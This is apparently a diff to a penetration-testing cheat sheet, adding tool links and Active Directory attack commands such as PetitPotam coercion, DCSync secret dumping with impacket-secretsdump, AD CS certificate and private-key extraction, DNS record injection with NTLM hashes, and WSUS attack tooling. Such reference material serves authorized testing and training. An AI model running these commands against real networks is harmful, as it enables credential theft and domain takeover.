@@ -15,8 +15,10 @@
 ## Table of Contents
 
 - [Tool Reference](#tool-reference)
+  - [File Transfer Tools](#file-transfer)
 - [Commands](#commands)
   - [Basics](#basics)
+    - [File Transfer](#file-transfer-1)
   - [Information Gathering](#information-gathering)
   - [Web Application Analysis](#web-application-analysis)
   - [Database Analysis](#database-analysis)
@@ -48,6 +50,7 @@
 | Netsh PortProxy | https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy |
 | NTP / ntpdate | https://www.ntp.org/ |
 | OpenSSH | https://www.openssh.com/ |
+| pip / pipx | https://pipx.pypa.io/ |
 | Plink / PuTTY | https://www.chiark.greenend.org.uk/~sgtatham/putty/ |
 | Proxychains-ng | https://github.com/rofl0r/proxychains-ng |
 | Samba / smbclient / rpcclient / nmblookup | https://www.samba.org/ |
@@ -63,6 +66,7 @@
 | curl | https://curl.se/ |
 | FTP | https://www.gnu.org/software/inetutils/ |
 | Impacket SMB Server | https://github.com/fortra/impacket |
+| Info-ZIP / zip / unzip | https://infozip.sourceforge.net/ |
 | Netcat / Ncat | https://nmap.org/ncat/ |
 | PHP Built-in Web Server | https://www.php.net/manual/en/features.commandline.webserver.php |
 | PowerShell Invoke-WebRequest | https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest |
@@ -73,7 +77,7 @@
 
 | Name | URL |
 | --- | --- |
-| BIND / dig | https://www.isc.org/bind/ |
+| BIND / dig / nslookup | https://www.isc.org/bind/ |
 | enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
 | ldapsearch / OpenLDAP | https://www.openldap.org/ |
 | memcached | https://memcached.org/ |
@@ -154,6 +158,9 @@
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
 | Mono / monodis | https://www.mono-project.com/docs/tools+libraries/tools/monodis/ |
+| dnSpyEx | https://github.com/dnSpyEx/dnSpy |
+| ILSpy / ilspycmd | https://github.com/icsharpcode/ILSpy |
+| JetBrains dotPeek | https://www.jetbrains.com/decompiler/ |
 | ADCSKiller | https://github.com/grimlockx/ADCSKiller |
 | ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
 | ADMiner | https://github.com/Mazars-Tech/AD_Miner |
@@ -169,6 +176,7 @@
 | Impacket | https://github.com/fortra/impacket |
 | JAWS | https://github.com/411Hall/JAWS |
 | JuicyPotatoNG | https://github.com/antonioCoco/JuicyPotatoNG |
+| krbrelayx / dnstool.py | https://github.com/dirkjanm/krbrelayx |
 | LAPSDumper | https://github.com/n00py/LAPSDumper |
 | LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
 | LinPEAS | https://github.com/carlospolop/linpeas |
@@ -197,6 +205,7 @@
 | WESNG | https://github.com/bitsadmin/wesng |
 | Whisker | https://github.com/eladshamir/Whisker |
 | pyWhisker | https://github.com/ShutdownRepo/pywhisker |
+| wsuks | https://github.com/NeffIsBack/wsuks |
 | ZeroLogon Tester | https://github.com/SecuraBV/CVE-2020-1472 |
 
 ### Payloads & Shells
@@ -227,6 +236,7 @@
 
 | Name | URL |
 | --- | --- |
+| Certreq | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1 |
 | DiskShadow | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow |
 | PsExec | https://learn.microsoft.com/en-us/sysinternals/downloads/psexec |
 | Schtasks | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks |
@@ -316,6 +326,14 @@ powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfil
 sudo python3 -m http.server 80                                   # host files over HTTP on port 80
 python3 -m http.server 8000                                      # host files over HTTP on port 8000
 sudo php -S 127.0.0.1:80                                         # start local PHP development web server
+```
+
+##### Archive Packaging
+```bash
+zip <ARCHIVE>.zip <FILE>                                         # package one file into ZIP archive
+zip -r <ARCHIVE>.zip <DIRECTORY>/                                # package directory recursively into ZIP archive
+unzip -l <ARCHIVE>.zip                                           # list ZIP archive contents
+unzip <ARCHIVE>.zip -d <OUTPUT_DIR>                              # extract ZIP archive to directory
 ```
 
 #### FTP
@@ -1086,6 +1104,7 @@ Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Un
 
 ```bash
 monodis --output=<OUTPUT>.il <ASSEMBLY>.exe                                      # disassemble .NET assembly to IL for review
+ilspycmd -p -o <OUTPUT_DIR> <ASSEMBLY>.exe                                       # decompile .NET assembly to C# project
 ```
 
 #### Windows Credential Harvesting
@@ -1359,6 +1378,13 @@ python3 PetitPotam.py <RHOST> <DOMAIN>                            # coerce machi
 certipy auth -pfx dc.pfx -dc-ip <RHOST>                           # authenticate as machine with PFX
 export KRB5CCNAME=dc.ccache                                       # use machine Kerberos cache
 impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>          # dump secrets with machine ticket
+
+# CSR / certificate handling
+openssl req -new -newkey rsa:2048 -nodes -keyout <CERT>.key -out <CERT>.csr -subj "/CN=<FQDN>" -addext "subjectAltName=DNS:<FQDN>"    # generate key and CSR with SAN
+certreq -submit -config "<CA_HOST>\<CA_NAME>" -attrib "CertificateTemplate:<TEMPLATE>" <CERT>.csr <CERT>.cer    # submit CSR to AD CS
+openssl pkcs12 -export -inkey <CERT>.key -in <CERT>.cer -out <CERT>.pfx    # bundle cert and key as PFX
+openssl pkcs12 -in <CERT>.pfx -out <CERT>.crt -clcerts -nokeys -passin pass:'<PASSWORD>'    # extract certificate from PFX
+openssl pkcs12 -in <CERT>.pfx -out <CERT>.key -nocerts -nodes -passin pass:'<PASSWORD>'    # extract private key from PFX
 ```
 
 #### BloodHound
@@ -1451,6 +1477,14 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAM
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'    # set AD user password
 ```
 
+#### AD DNS
+
+```bash
+python3 dnstool.py -u '<DOMAIN>\<ACCOUNT>$' --hashes ':<NTLM_HASH>' -r <HOSTNAME>.<DOMAIN> -a add -d <LHOST> <DC_IP>    # add AD-integrated DNS A record
+python3 dnstool.py -u '<DOMAIN>\<ACCOUNT>$' --hashes ':<NTLM_HASH>' -r <HOSTNAME>.<DOMAIN> -a remove <DC_IP>             # remove AD-integrated DNS record
+nslookup <HOSTNAME>.<DOMAIN> <DC_IP>                                                                                      # verify DNS record from DC
+```
+
 #### Shadow Credentials
 
 ```bash
@@ -1510,6 +1544,16 @@ net group "Exchange Windows Permissions" /add <USERNAME>         # add user to E
 # Import PowerView, then:
 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync    # grant DCSync rights
 impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'             # dump domain secrets with new rights
+```
+
+#### WSUS Testing
+
+```bash
+sudo apt install pipx python3-nftables                           # install wsuks prerequisites on Debian/Kali
+pipx ensurepath                                                  # ensure pipx-installed tools are in PATH
+pipx install wsuks --system-site-packages                        # install WSUS testing helper in isolated environment
+sudo wsuks --help                                                # show WSUS testing options
+wget https://live.sysinternals.com/tools/PsExec64.exe            # download PsExec64 for authorized lab payload testing
 ```
 
 #### pwncat
